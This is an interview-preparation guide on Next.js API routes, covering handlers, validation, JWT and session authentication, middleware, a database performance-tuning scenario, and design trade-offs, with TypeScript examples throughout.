# Next.js API Routes

> Creating API endpoints, middleware, authentication, error handling, and API best practices.

---

## Question 1: Next.js API Routes Basics

**Difficulty:** 🟢 Easy
**Frequency:** ⭐⭐⭐⭐
**Time:** 7 minutes
**Companies:** Vercel, Meta

### Question
How do Next.js API routes work? How to create REST API?

### Answer

**API Routes** - Serverless functions that run on Node.js, allowing you to build API endpoints within Next.js.

**Key Points:**
1. **File-based routing** - Any file in `pages/api` is an API endpoint
2. **Serverless** - Each route is a separate serverless function
3. **Full stack** - Build frontend and backend in one project
4. **TypeScript support** - Full type safety
5. **Middleware support** - Auth, logging, etc.

### Code Example

```typescript
// 1. BASIC API ROUTE
// pages/api/hello.ts
import type { NextApiRequest, NextApiResponse } from 'next';

type Data = {
  message: string;
};

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  res.status(200).json({ message: 'Hello from API!' });
}

// 2. HANDLING HTTP METHODS
// pages/api/users/[id].ts
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { id } = req.query;

  switch (req.method) {
    case 'GET':
      const user = await getUser(id as string);
      return res.status(200).json(user);

    case 'PUT':
      const updated = await updateUser(id as string, req.body);
      return res.status(200).json(updated);

    case 'DELETE':
      await deleteUser(id as string);
      return res.status(204).end();

    default:
      res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
      return res.status(405).json({ error: `Method ${req.method} not allowed` });
  }
}

// 3. REQUEST BODY & VALIDATION
interface CreateUserBody {
  name: string;
  email: string;
  age?: number;
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, email, age } = req.body as CreateUserBody;

  // Validation
  if (!name || !email) {
    return res.status(400).json({ error: 'Name and email are required' });
  }

  if (email && !email.includes('@')) {
    return res.status(400).json({ error: 'Invalid email format' });
  }

  try {
    const user = await createUser({ name, email, age });
    return res.status(201).json(user);
  } catch (error) {
    return res.status(500).json({ error: 'Failed to create user' });
  }
}

// 4. QUERY PARAMETERS
// GET /api/posts?page=1&limit=10&sort=desc
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const {
    page = '1',
    limit = '10',
    sort = 'asc'
  } = req.query;

  const posts = await getPosts({
    page: parseInt(page as string),
    limit: parseInt(limit as string),
    sort: sort as string
  });

  res.status(200).json(posts);
}

// 5. COOKIES & HEADERS
import cookie from 'cookie';

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  // Read cookies
  const cookies = cookie.parse(req.headers.cookie || '');
  const token = cookies.token;

  // Read headers
  const userAgent = req.headers['user-agent'];

  // Set cookies
  res.setHeader(
    'Set-Cookie',
    cookie.serialize('token', 'abc123', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      maxAge: 60 * 60 * 24 * 7, // 1 week
      path: '/'
    })
  );

  // Set custom headers
  res.setHeader('X-Custom-Header', 'value');

  res.status(200).json({ success: true });
}

// 6. FILE UPLOAD
import formidable from 'formidable';
import fs from 'fs';

// Disable body parser
export const config = {
  api: {
    bodyParser: false
  }
};

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const form = formidable({ uploadDir: './uploads', keepExtensions: true });

  form.parse(req, async (err, fields, files) => {
    if (err) {
      return res.status(500).json({ error: 'Upload failed' });
    }

    const file = files.file;
    // Process file...

    res.status(200).json({ success: true, file: file.filepath });
  });
}

// 7. ERROR HANDLING
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  try {
    const data = await fetchData();
    res.status(200).json(data);
  } catch (error) {
    console.error('API Error:', error);

    if (error instanceof ValidationError) {
      return res.status(400).json({ error: error.message });
    }

    if (error instanceof NotFoundError) {
      return res.status(404).json({ error: 'Resource not found' });
    }

    // Generic error
    res.status(500).json({ error: 'Internal server error' });
  }
}

// 8. DYNAMIC ROUTES
// pages/api/posts/[postId]/comments/[commentId].ts
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { postId, commentId } = req.query;

  const comment = await getComment(
    postId as string,
    commentId as string
  );

  res.status(200).json(comment);
}

// 9. CATCH-ALL ROUTES
// pages/api/[...slug].ts
export default function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { slug } = req.query;
  // slug is an array: /api/a/b/c => ['a', 'b', 'c']

  res.status(200).json({ path: slug });
}

// 10. CORS
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Your API logic
  res.status(200).json({ message: 'CORS enabled' });
}
```

### Common Mistakes

- ❌ Not checking HTTP method (security risk)
- ❌ Not validating request body
- ❌ Exposing sensitive data in responses
- ❌ Not handling errors properly
- ✅ Always validate input
- ✅ Use TypeScript for type safety
- ✅ Set appropriate status codes

### Follow-up Questions

1. How do API routes differ from traditional Express.js?
2. Can you use API routes for GraphQL?
3. How do you handle authentication in API routes?

### Resources
- [Next.js API Routes](https://nextjs.org/docs/api-routes/introduction)

---

<details>
<summary><strong>🔍 Deep Dive: How Next.js API Routes Work Under the Hood</strong></summary>

## 🔍 Deep Dive: How Next.js API Routes Work Under the Hood

Next.js API routes are fundamentally serverless functions that execute on-demand within Node.js environments, but their implementation involves sophisticated mechanisms that differentiate them from traditional server architectures.

**Internal Architecture:**

When you create a file in `pages/api`, Next.js performs several transformations during the build process. The framework wraps your exported handler function with internal middleware that handles the HTTP server lifecycle. Each API route becomes an isolated serverless function that can be deployed independently to platforms like Vercel, AWS Lambda, or other serverless providers.

The routing mechanism uses a file-system-based router similar to page routing. Next.js compiles a manifest during build time that maps URL paths to their corresponding handler functions. When a request arrives, the framework's internal router matches the URL against this manifest, extracts dynamic parameters from the URL (like `[id]` segments), and invokes the appropriate handler with a pre-populated `req.query` object.

**Request/Response Lifecycle:**

The `NextApiRequest` and `NextApiResponse` objects are enhanced versions of Node.js's native `IncomingMessage` and `ServerResponse`. Next.js adds helper methods like `res.json()`, `res.status()`, and automatic body parsing. The body parser middleware runs before your handler, automatically parsing JSON and URL-encoded bodies based on the `Content-Type` header. You can configure or disable this behavior using the `api.bodyParser` config option.

**Serverless Constraints:**

Unlike traditional Express.js servers that maintain long-running processes, serverless functions have strict execution time limits (typically 10-30 seconds) and cold start penalties. Each invocation might spin up a new container, meaning you cannot rely on in-memory state persisting between requests. This architectural choice forces better practices like stateless design and external session storage.

**Performance Optimizations:**

Next.js implements several optimizations for API routes. Functions are bundled separately, allowing for code splitting at the API level. Only the dependencies required by a specific route are included in its bundle. The framework also supports streaming responses through Node.js's native stream APIs, enabling efficient handling of large payloads without loading everything into memory.

**Edge vs. Node.js Runtime:**

Next.js 12+ introduced Edge Runtime support for API routes through middleware. Edge functions run on a lightweight V8 isolate rather than a full Node.js environment, providing sub-50ms cold starts globally. However, this comes with restrictions: no native Node.js modules, smaller bundle size limits (1MB), and reduced execution time (30 seconds max). Choose Edge for geographically distributed, latency-sensitive operations; use Node.js runtime for compute-intensive tasks or when you need full Node.js API access.

**Dynamic Route Resolution:**

Dynamic routes like `[id]` use a priority system: static routes match first, then dynamic routes, then catch-all routes (`[...slug]`). This hierarchy ensures predictable routing behavior. The framework converts file paths to regex patterns during build time for efficient matching at runtime.

**Production Deployment Considerations:**

When deploying to Vercel, each API route becomes a separate lambda function. On other platforms, you might bundle all routes into a single Node.js server. Understanding your deployment target is crucial for optimizing cold start performance, managing memory limits, and handling concurrent request limits. Connection pooling becomes critical when integrating databases, as serverless environments can quickly exhaust database connection pools without proper management.

</details>

<details>
<summary><strong>🐛 Real-World Scenario: API Route Performance Crisis</strong></summary>

## 🐛 Real-World Scenario: API Route Performance Crisis

**Production Context:**
A SaaS dashboard application with 50,000 daily active users experienced severe performance degradation after launching a new analytics feature. The `/api/analytics/dashboard` endpoint was taking 8-12 seconds to respond during peak hours (9-11 AM), causing user complaints and timeout errors.

**Initial Metrics:**
- Average response time: 8,200ms (p50), 14,500ms (p95)
- Error rate: 12% (mostly 504 Gateway Timeout)
- Database connection pool exhaustion: 67 errors/hour
- Serverless function timeout rate: 23%
- User abandonment: 34% before page load completed

**Root Cause Analysis:**

**Investigation Steps:**

1. **Enabled detailed logging:**
```typescript
// Added performance tracking
const start = Date.now();
console.log('[API] Request started:', req.url);

// ... handler logic ...

console.log('[API] Request completed:', {
  duration: Date.now() - start,
  method: req.method,
  path: req.url
});
```

2. **Discovered N+1 query problem:**
```typescript
// ❌ PROBLEM: Fetching users one by one
const users = await prisma.user.findMany();
for (const user of users) {
  // Making separate DB query for each user
  const stats = await prisma.analytics.findMany({
    where: { userId: user.id }
  });
  // 500 users = 500 additional queries!
}
```

3. **Found missing database indices:**
```sql
-- EXPLAIN ANALYZE showed seq scans on 2.5M row table
EXPLAIN ANALYZE SELECT * FROM analytics WHERE userId = '123' AND createdAt > '2024-01-01';
-- Seq Scan on analytics (cost=0.00..52341.00 rows=125000 width=186) (actual time=4523ms)
```

4. **Identified Prisma client instantiation issue:**
```typescript
// ❌ PROBLEM: Creating new Prisma client on every request
export default async function handler(req, res) {
  const prisma = new PrismaClient(); // Cold start penalty: +800ms
  const data = await prisma.user.findMany();
  await prisma.$disconnect();
  res.json(data);
}
```

**Solution Implementation:**

**Step 1: Optimized database queries**
```typescript
// ✅ SOLUTION: Use joins and aggregations
const analytics = await prisma.user.findMany({
  include: {
    analytics: {
      where: {
        createdAt: {
          gte: startDate,
          lte: endDate
        }
      }
    },
    _count: {
      select: { sessions: true, pageViews: true }
    }
  }
});

// Single query instead of 500+
// Reduced query time: 6,800ms → 340ms
```

**Step 2: Added database indices**
```prisma
model Analytics {
  id        String   @id
  userId    String
  createdAt DateTime

  @@index([userId, createdAt]) // Composite index
  @@index([createdAt]) // For date range queries
}
```

**Step 3: Implemented Prisma singleton**
```typescript
// lib/prisma.ts
import { PrismaClient } from '@prisma/client';

const globalForPrisma = global as unknown as { prisma: PrismaClient };

export const prisma = globalForPrisma.prisma || new PrismaClient({
  log: process.env.NODE_ENV === 'development' ? ['query', 'error', 'warn'] : ['error'],
});

if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;

// Reduced initialization time: 800ms → 0ms (cached)
```

**Step 4: Added response caching**
```typescript
import { unstable_cache } from 'next/cache';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { userId, range = '7d' } = req.query;

  const cacheKey = `analytics-${userId}-${range}`;

  const getCachedData = unstable_cache(
    async () => fetchAnalytics(userId as string, range as string),
    [cacheKey],
    { revalidate: 300 } // Cache for 5 minutes
  );

  const data = await getCachedData();

  res.setHeader('Cache-Control', 's-maxage=300, stale-while-revalidate');
  res.status(200).json(data);
}
```

**Step 5: Implemented pagination**
```typescript
// ✅ SOLUTION: Limit data size
const { page = '1', limit = '50' } = req.query;
const pageNum = parseInt(page as string);
const limitNum = Math.min(parseInt(limit as string), 100); // Max 100

const [data, total] = await Promise.all([
  prisma.analytics.findMany({
    skip: (pageNum - 1) * limitNum,
    take: limitNum,
    orderBy: { createdAt: 'desc' }
  }),
  prisma.analytics.count()
]);

res.json({
  data,
  pagination: { page: pageNum, limit: limitNum, total, pages: Math.ceil(total / limitNum) }
});
```

**Post-Fix Metrics:**
- Average response time: 420ms (p50), 890ms (p95) - **95% improvement**
- Error rate: 0.3% - **97% reduction**
- Database connection issues: 0 errors/hour - **100% fixed**
- Serverless timeout rate: 0% - **eliminated**
- User satisfaction: 89% positive feedback
- Page load completion: 96% - **62% improvement**

**Cost Impact:**
- Lambda execution time reduced by 94%
- Monthly AWS Lambda costs: $1,240 → $185 (85% reduction)
- Database query costs: $340 → $95 (72% reduction)

**Key Lessons:**
1. Always use connection pooling and singleton patterns in serverless
2. Add database indices before launching features
3. Implement caching for expensive computations
4. Monitor API response times with detailed logging
5. Use pagination to limit response sizes
6. Optimize database queries with joins instead of loops

</details>

<details>
<summary><strong>⚖️ Trade-offs: API Routes Design Decisions</strong></summary>

## ⚖️ Trade-offs: API Routes Design Decisions

### 1. Pages Router API Routes vs. App Router Route Handlers

**Pages Router (`pages/api/users.ts`):**

**Pros:**
- Mature, well-documented ecosystem
- Full Node.js runtime access
- Simpler mental model (one handler per file)
- Better IDE autocomplete for `NextApiRequest`/`NextApiResponse`
- Established patterns for middleware composition

**Cons:**
- Cannot colocate with components
- No streaming by default
- Separate from React Server Components
- Less type safety for route parameters
- No native support for modern Web APIs (Request/Response)

**App Router (`app/api/users/route.ts`):**

**Pros:**
- Native Web API support (Request/Response objects)
- Streaming responses built-in
- Colocation with app structure
- Better TypeScript inference for params
- Edge Runtime support by default
- Works seamlessly with Server Components

**Cons:**
- Newer, fewer community examples
- Different API from pages router (migration cost)
- Requires understanding of App Router conventions
- Some middleware patterns need rethinking

**Decision Matrix:**
- **Choose Pages Router if:** Existing project, need maximum stability, heavy middleware usage
- **Choose App Router if:** New project, need streaming, Edge Runtime, colocated API logic

---

### 2. JWT vs. Session-Based Authentication

**JWT (Stateless):**

**Pros:**
- Scales horizontally (no server-side state)
- Works across multiple services/domains
- No database lookup on every request
- Perfect for serverless (no shared state)
- Can include custom claims (roles, permissions)

**Cons:**
- Cannot invalidate tokens before expiry (unless using blacklist)
- Larger payload (cookies typically 300-500 bytes)
- Token refresh complexity
- XSS vulnerability if stored in localStorage
- No centralized session management

**Session-Based (Stateful):**

**Pros:**
- Easy to revoke access immediately
- Smaller cookie size (~50 bytes session ID)
- Server-side session data storage
- More control over session lifecycle
- Easier to implement logout

**Cons:**
- Requires session store (Redis, database)
- Doesn't scale as easily (sticky sessions or shared store)
- Database lookup on every request
- Complex in distributed systems
- Not ideal for serverless

**Hybrid Approach (Best of Both):**
```typescript
// Use short-lived JWT (15min) + refresh token in httpOnly cookie
{
  accessToken: 'eyJhbGc...', // 15min expiry, in memory
  refreshToken: 'abc123...' // 7 days, httpOnly cookie, can be revoked
}
```

**Decision Matrix:**
- **Choose JWT if:** Microservices, serverless, mobile apps, high scale
- **Choose Sessions if:** Monolith, need immediate revocation, simpler auth logic
- **Choose Hybrid if:** Enterprise app needing security + scalability

---

### 3. Prisma vs. Raw SQL vs. Query Builders

**Prisma:**

**Performance:**
- Query: ~15ms overhead vs. raw SQL
- Migration: Auto-generated, type-safe
- Bundle size: +500KB
- Cold start: +120ms (client initialization)

**Developer Experience:**
- Type safety: Excellent (auto-generated types)
- Learning curve: Medium (schema language)
- Productivity: Very high
- Debugging: Good (query logging)

**Pros:**
- Full TypeScript support
- Auto-generated types from schema
- Powerful relation handling
- Built-in connection pooling
- Great migration system

**Cons:**
- Adds abstraction overhead
- Limited control over complex queries
- Larger bundle size
- Vendor lock-in to Prisma

**Raw SQL:**

**Performance:**
- Query: Fastest (no overhead)
- Migration: Manual
- Bundle size: ~0KB
- Cold start: Minimal

**Developer Experience:**
- Type safety: None (need manual types)
- Learning curve: High (SQL expertise needed)
- Productivity: Lower
- Debugging: Manual query logging

**Pros:**
- Maximum performance
- Full control over queries
- No abstraction overhead
- Works with any database

**Cons:**
- No type safety
- SQL injection risks
- Manual schema management
- More boilerplate code

**Query Builders (Drizzle, Kysely):**

**Performance:**
- Query: ~5ms overhead
- Migration: Type-safe
- Bundle size: +100KB
- Cold start: +30ms

**Developer Experience:**
- Type safety: Excellent
- Learning curve: Medium
- Productivity: High
- Debugging: Good

**Decision Matrix:**
- **Choose Prisma if:** Full-stack app, need rapid development, TypeScript-first
- **Choose Raw SQL if:** Performance-critical, complex queries, SQL expertise
- **Choose Query Builder if:** Want type safety without Prisma overhead

**Real-World Example:**
```typescript
// Prisma: Best for standard CRUD
const users = await prisma.user.findMany({
  include: { posts: true }
});

// Raw SQL: Best for complex analytics
const stats = await prisma.$queryRaw`
  SELECT date_trunc('day', created_at) as day,
         COUNT(*) as count,
         AVG(amount) as avg_amount
  FROM transactions
  WHERE created_at > NOW() - INTERVAL '30 days'
  GROUP BY day
  ORDER BY day DESC
`;

// Hybrid: Use both strategically
```

---

### 4. REST vs. GraphQL vs. tRPC for Next.js APIs

**REST API Routes:**

**Pros:**
- Simple, well-understood
- HTTP caching works naturally
- Easy to debug (curl, Postman)
- No additional dependencies
- Works with any client

**Cons:**
- Over-fetching/under-fetching
- Multiple endpoints for complex data
- No type safety between client/server
- Manual API versioning

**GraphQL:**

**Pros:**
- Single endpoint
- Client specifies exact data needs
- Strong type system
- Great for complex data requirements

**Cons:**
- Complexity overhead (+50KB libraries)
- Caching is harder
- N+1 query problems
- Steeper learning curve

**tRPC:**

**Pros:**
- End-to-end type safety (no codegen)
- Minimal overhead (~20KB)
- RPC-style (feels like local functions)
- Perfect for TypeScript monorepos
- Easy to refactor

**Cons:**
- TypeScript-only
- Not suitable for public APIs
- Requires monorepo structure
- Smaller ecosystem than REST/GraphQL

**Decision Matrix:**
- **Choose REST if:** Public API, simple CRUD, need HTTP caching
- **Choose GraphQL if:** Complex data needs, mobile apps, multiple clients
- **Choose tRPC if:** TypeScript monorepo, internal API, rapid development

</details>

<details>
<summary><strong>💬 Explain to Junior: Understanding Next.js API Routes</strong></summary>

## 💬 Explain to Junior: Understanding Next.js API Routes

**Beginner-Friendly Explanation:**

Think of Next.js API routes like the kitchen in a restaurant. When a customer (your frontend) places an order (makes a request), the kitchen (API route) prepares the food (processes data) and sends it back to the customer.

**Simple Analogy:**

Imagine you're building a todo app. The frontend shows tasks to users, but where do those tasks come from? How do you save new tasks? This is where API routes come in.

**Without API routes:**
Your React components would need to directly connect to a database, which is dangerous (anyone could see your database credentials in the browser code!).

**With API routes:**
```
User clicks "Add Task"
  → Frontend calls /api/tasks (POST)
  → API route validates data
  → Saves to database
  → Returns success/error
  → Frontend updates UI
```

**The Magic of File-Based Routing:**

Next.js makes creating APIs super easy. Just create a file in the `pages/api` folder:

```
pages/api/hello.ts → Available at /api/hello
pages/api/users/[id].ts → Available at /api/users/123
```

It's like organizing your kitchen: each station (file) handles specific dishes (endpoints).

**Basic Example for Beginners:**

```typescript
// pages/api/tasks.ts
export default async function handler(req, res) {
  // Check what the user wants to do
  if (req.method === 'GET') {
    // User wants to see all tasks
    const tasks = await database.getAllTasks();
    return res.status(200).json(tasks);
  }

  if (req.method === 'POST') {
    // User wants to create a new task
    const { title, description } = req.body;

    // Validate (like checking if ingredients are fresh)
    if (!title) {
      return res.status(400).json({ error: 'Title is required' });
    }

    // Save to database
    const newTask = await database.createTask({ title, description });

    // Send back the created task
    return res.status(201).json(newTask);
  }

  // User tried something we don't support
  return res.status(405).json({ error: 'Method not allowed' });
}
```

**Key Concepts Simplified:**

**1. Request (req):**
Think of this as the order ticket from a customer. It contains:
- `req.method`: What action? (GET = read, POST = create, PUT = update, DELETE = delete)
- `req.body`: The data they're sending (like ingredients for a new dish)
- `req.query`: URL parameters (like table number in `/api/table?number=5`)

**2. Response (res):**
This is how you send food back to the customer:
- `res.status(200)`: Everything went well
- `res.status(400)`: Bad request (customer ordered something weird)
- `res.status(500)`: Kitchen error (something broke on our end)
- `res.json(data)`: Send data back as JSON

**3. Why Use API Routes?**

**Security:**
```typescript
// ❌ BAD: Database credentials in frontend
const db = connectDatabase('secret-password'); // Everyone can see this!

// ✅ GOOD: Credentials only in API route (server-side)
// .env.local
DATABASE_URL=postgresql://secret-password@localhost/db
// Only server has access to this
```

**Business Logic:**
```typescript
// API route can validate, transform, and protect data
export default async function handler(req, res) {
  const { email, password } = req.body;

  // Validation (protect your data)
  if (!email.includes('@')) {
    return res.status(400).json({ error: 'Invalid email' });
  }

  // Hash password (security)
  const hashedPassword = await bcrypt.hash(password, 10);

  // Save safely
  const user = await db.createUser({ email, hashedPassword });

  res.status(201).json({ id: user.id, email: user.email });
  // Never send password back!
}
```

**Common Beginner Mistakes:**

**Mistake 1: Forgetting to check HTTP method**
```typescript
// ❌ BAD: Anyone can delete with any method
export default async function handler(req, res) {
  await deleteAllUsers(); // Dangerous!
  res.json({ success: true });
}

// ✅ GOOD: Only allow DELETE method
export default async function handler(req, res) {
  if (req.method !== 'DELETE') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  await deleteAllUsers();
  res.json({ success: true });
}
```

**Mistake 2: Not validating input**
```typescript
// ❌ BAD: Trust user input blindly
export default async function handler(req, res) {
  const user = await db.createUser(req.body); // What if req.body is malicious?
  res.json(user);
}

// ✅ GOOD: Validate everything
export default async function handler(req, res) {
  const { name, email } = req.body;

  if (!name || !email) {
    return res.status(400).json({ error: 'Name and email required' });
  }

  if (!email.includes('@')) {
    return res.status(400).json({ error: 'Invalid email' });
  }

  const user = await db.createUser({ name, email });
  res.json(user);
}
```

**Interview Answer Template:**

"Next.js API routes are serverless functions that allow you to create backend endpoints within your Next.js application. They're file-based, meaning creating a file in `pages/api` automatically creates an API endpoint at that path.

For example, `pages/api/users.ts` creates an endpoint at `/api/users`. Each API route exports a handler function that receives request and response objects. You can handle different HTTP methods (GET, POST, etc.) within this handler.

The key benefits are: you can keep frontend and backend in one project, it's serverless so it scales automatically, and you have full TypeScript support. It's commonly used for authentication, database operations, and any server-side logic you don't want exposed to the client.

A simple example would be fetching users from a database: check the HTTP method is GET, query the database, and return the results as JSON. For creating users, check for POST method, validate the request body, save to database, and return the created user."

**When to Use API Routes:**
- Talking to databases
- Handling authentication (login, signup)
- Calling external APIs with secret keys
- Processing payments
- File uploads
- Any logic that needs to stay secret/secure

**When NOT to Use API Routes:**
- Simple page rendering (use Server Components in App Router)
- Static data (use SSG instead)
- Public data that doesn't need protection

</details>

---

## Question 2: Middleware and Authentication

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 10 minutes
**Companies:** All companies

### Question
How do you implement middleware and authentication in Next.js API routes?

### Answer

**Middleware** - Functions that run before your API route handler.
**Authentication** - Verify user identity and protect routes.

**Key Points:**
1. **Middleware pattern** - Wrap handlers with auth logic
2. **JWT tokens** - Stateless authentication
3. **Session-based** - Server-side sessions
4. **Edge middleware** - Run at edge for performance
5. **Protected routes** - Block unauthorized access

### Code Example

```typescript
// 1. AUTH MIDDLEWARE PATTERN
// lib/middleware/auth.ts
import jwt from 'jsonwebtoken';
import type { NextApiRequest, NextApiResponse, NextApiHandler } from 'next';

export interface AuthenticatedRequest extends NextApiRequest {
  user?: {
    id: string;
    email: string;
  };
}

export function withAuth(handler: NextApiHandler) {
  return async (req: AuthenticatedRequest, res: NextApiResponse) => {
    const token = req.headers.authorization?.replace('Bearer ', '');

    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }

    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;
      req.user = { id: decoded.id, email: decoded.email };

      return handler(req, res);
    } catch (error) {
      return res.status(401).json({ error: 'Invalid token' });
    }
  };
}

// Usage
// pages/api/protected.ts
import { withAuth, AuthenticatedRequest } from '@/lib/middleware/auth';

async function handler(req: AuthenticatedRequest, res: NextApiResponse) {
  // req.user is available
  res.status(200).json({ message: `Hello ${req.user!.email}` });
}

export default withAuth(handler);

// 2. LOGIN ENDPOINT
// pages/api/auth/login.ts
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body;

  // Find user
  const user = await db.user.findUnique({ where: { email } });

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Verify password
  const valid = await bcrypt.compare(password, user.hashedPassword);

  if (!valid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Generate JWT
  const token = jwt.sign(
    { id: user.id, email: user.email },
    process.env.JWT_SECRET!,
    { expiresIn: '7d' }
  );

  res.status(200).json({ token, user: { id: user.id, email: user.email } });
}

// 3. SIGNUP ENDPOINT
// pages/api/auth/signup.ts
import bcrypt from 'bcrypt';

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password, name } = req.body;

  // Validation
  if (!email || !password || password.length < 8) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // Check if user exists
  const existing = await db.user.findUnique({ where: { email } });

  if (existing) {
    return res.status(409).json({ error: 'User already exists' });
  }

  // Hash password
  const hashedPassword = await bcrypt.hash(password, 10);

  // Create user
  const user = await db.user.create({
    data: { email, name, hashedPassword }
  });

  const token = jwt.sign(
    { id: user.id, email: user.email },
    process.env.JWT_SECRET!,
    { expiresIn: '7d' }
  );

  res.status(201).json({ token, user: { id: user.id, email: user.email } });
}

// 4. EDGE MIDDLEWARE (Next.js 12+)
// middleware.ts (root level)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const token = request.cookies.get('token');

  // Protect /dashboard routes
  if (request.nextUrl.pathname.startsWith('/dashboard')) {
    if (!token) {
      return NextResponse.redirect(new URL('/login', request.url));
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: '/dashboard/:path*'
};

// 5. ROLE-BASED ACCESS CONTROL (RBAC)
// lib/middleware/rbac.ts
export function withRole(role: string, handler: NextApiHandler) {
  return withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) => {
    const user = await db.user.findUnique({
      where: { id: req.user!.id }
    });

    if (user?.role !== role) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    return handler(req, res);
  });
}

// Usage
// pages/api/admin/users.ts
async function handler(req: AuthenticatedRequest, res: NextApiResponse) {
  const users = await db.user.findMany();
  res.status(200).json(users);
}

export default withRole('admin', handler);

// 6. REFRESH TOKEN PATTERN
// pages/api/auth/refresh.ts
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET!) as any;

    // Check if refresh token is still valid in DB
    const session = await db.session.findUnique({
      where: { refreshToken }
    });

    if (!session) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }

    // Generate new access token
    const accessToken = jwt.sign(
      { id: decoded.id, email: decoded.email },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.status(200).json({ accessToken });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
}

// 7. SESSION-BASED AUTH
// pages/api/auth/login-session.ts
import { ironSession } from 'iron-session/express';

const sessionOptions = {
  password: process.env.SESSION_SECRET!,
  cookieName: 'myapp_session',
  cookieOptions: {
    secure: process.env.NODE_ENV === 'production'
  }
};

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const session = await ironSession(req, res, sessionOptions);

  if (req.method === 'POST') {
    const { email, password } = req.body;

    const user = await validateUser(email, password);

    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Store user in session
    session.user = { id: user.id, email: user.email };
    await session.save();

    res.status(200).json({ user: session.user });
  }
}

// 8. LOGOUT
// pages/api/auth/logout.ts
export default withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) => {
  // Clear session/token
  res.setHeader(
    'Set-Cookie',
    'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly'
  );

  res.status(200).json({ message: 'Logged out' });
});
```

### Common Mistakes

- ❌ Storing passwords in plain text
- ❌ Not validating JWT properly
- ❌ Exposing JWT_SECRET in client code
- ❌ Not using HTTPS in production
- ✅ Hash passwords with bcrypt
- ✅ Use environment variables for secrets
- ✅ Implement refresh token rotation

### Follow-up Questions

1. What's the difference between JWT and session-based auth?
2. How do you handle token refresh?
3. What is Edge Middleware and when to use it?

### Resources
- [Next.js Middleware](https://nextjs.org/docs/advanced-features/middleware)
- [NextAuth.js](https://next-auth.js.org/)

---

## 🔍 Deep Dive: Authentication Architecture and Middleware Patterns

Next.js provides multiple authentication approaches, each with different architectural implications. Understanding the internal mechanics helps you choose the right pattern for your security requirements.

**Middleware Composition Patterns:**

Traditional middleware in Express.js uses a linear chain of functions. Next.js API routes don't have built-in middleware support, so developers implement the higher-order function (HOF) pattern. A middleware function wraps your handler, executes pre-processing logic, and conditionally calls the next handler. This pattern enables composition: `withAuth(withLogging(withRateLimit(handler)))`.

The execution flow works like nested Russian dolls. When a request arrives, it passes through the outermost wrapper first (rate limiting), then the next layer (logging), then authentication, and finally reaches your handler. Each wrapper can short-circuit the chain by returning a response early (like a 401 Unauthorized), preventing inner handlers from executing.

**JWT Authentication Deep Dive:**

JSON Web Tokens are cryptographically signed JSON payloads. When you call `jwt.sign(payload, secret)`, the library creates three parts: header (algorithm), payload (your data), and signature (HMAC of header+payload using your secret). These are base64url-encoded and joined with dots: `header.payload.signature`.

The security model relies on the secret key never leaving your server. Anyone can decode a JWT and read the payload (it's just base64), but they cannot modify it without invalidating the signature. When your API receives a JWT, `jwt.verify()` recomputes the signature using your secret and compares it to the token's signature. If they match, the token is authentic.

**Critical Security Considerations:**

Storing JWTs in localStorage makes them accessible to JavaScript, creating XSS attack vectors. A malicious script injected into your app can steal tokens and impersonate users. Instead, store tokens in httpOnly cookies, which JavaScript cannot access. The browser automatically sends these cookies with requests, and the server reads them from `req.cookies`.

Token expiration creates a UX challenge: forcing re-login every 15 minutes frustrates users. The solution is refresh token rotation. Issue a short-lived access token (15 minutes) for API calls and a long-lived refresh token (7 days) stored in an httpOnly cookie. When the access token expires, call `/api/auth/refresh` to get a new one. This balances security (short exposure window) with usability (rarely re-login).

